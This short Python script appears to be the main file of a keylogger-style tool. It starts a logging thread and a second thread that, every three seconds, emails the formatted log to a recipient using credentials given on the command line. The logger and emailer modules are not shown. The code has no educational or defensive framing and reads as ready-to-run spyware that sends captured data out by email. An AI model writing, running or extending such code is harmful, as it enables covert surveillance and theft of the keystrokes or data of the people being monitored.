import sys
import threading
import time
from logger import Logger
from emailer import Emailer

if len(sys.argv) == 4:
    user = sys.argv[1]
    password = sys.argv[2]
    recipient = sys.argv[3]
    content = ''
    emailer = Emailer(user, password, recipient, content)
    logger = Logger()

    def email_threader():
        while True:
            time.sleep(3)
            emailer.content = logger.get_formatted_log()
            emailer.send_email()

    emailer_thread = threading.Thread(target=email_threader)
    logger_thread = threading.Thread(target=logger.log)

    emailer_thread.start()
    logger_thread.start()
else:
    print('error')
